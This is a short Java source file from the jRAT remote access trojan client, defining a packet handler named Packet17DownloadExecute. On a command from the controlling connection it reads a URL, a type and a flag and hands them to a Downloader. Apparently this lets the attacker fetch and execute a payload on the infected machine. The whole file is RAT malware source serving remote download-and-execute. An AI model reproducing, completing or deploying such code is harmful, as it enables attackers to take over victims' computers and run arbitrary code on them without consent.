package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.Downloader;

public class Packet17DownloadExecute implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String url = con.readLine();
		String type = con.readLine();
		boolean readFromSocket = con.readBoolean();

		new Downloader(con, url, false, type, readFromSocket).start();
	}

}